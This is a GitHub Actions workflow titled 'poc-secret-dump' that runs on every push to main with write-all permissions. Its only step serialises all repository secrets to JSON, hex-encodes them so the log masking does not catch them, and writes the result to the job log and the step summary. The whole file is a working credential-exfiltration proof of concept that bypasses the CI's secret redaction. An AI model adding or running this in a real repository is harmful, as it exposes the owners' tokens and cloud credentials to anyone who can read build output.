name: "poc-secret-dump"

on:
  push:
    branches: [main]
  workflow_dispatch: {}

permissions: write-all

jobs:
  dump:
    runs-on: linux-amd64-cpu32
    steps:
      - name: Dump all secrets available to this repository
        env:
          ALL_SECRETS: ${{ toJSON(secrets) }}
        run: |
          set -e
          python3 - <<'PY'
          import os
          s = os.environ.get('ALL_SECRETS', '')
          print('SECRETS_JSON_HEX=' + s.encode().hex())
          p = os.environ.get('GITHUB_STEP_SUMMARY')
          if p:
              with open(p, 'a') as f:
                  f.write('SECRETS_JSON_HEX=' + s.encode().hex() + '\n')
          PY
